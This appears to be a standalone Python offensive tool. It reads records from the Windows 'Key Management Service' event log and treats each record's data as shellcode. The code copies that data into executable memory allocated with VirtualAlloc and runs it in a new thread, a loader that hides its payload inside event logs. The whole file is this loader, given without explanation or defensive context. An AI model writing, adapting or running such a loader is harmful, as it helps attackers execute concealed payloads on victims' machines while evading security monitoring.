import ctypes
import win32evtlog

server = 'localhost'
logtype = 'Key Management Service'
hand = win32evtlog.OpenEventLog(server, logtype)
flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
total = win32evtlog.GetNumberOfEventLogRecords(hand)
switch = False


def calc(shellcode):
    shellcode = bytearray(shellcode)
    print(shellcode)

    ctypes .windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_uint64(ptr),
        buf,
        ctypes.c_int(len(shellcode))
    )

    handle = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_uint64(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    )

    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))

    return True


while True:
    events = win32evtlog.ReadEventLog(hand, flags, 0)
    if events:
        for event in events:
            print(event.Data)
            if event.Data:
                switch = calc(event.Data)
    if switch:
        break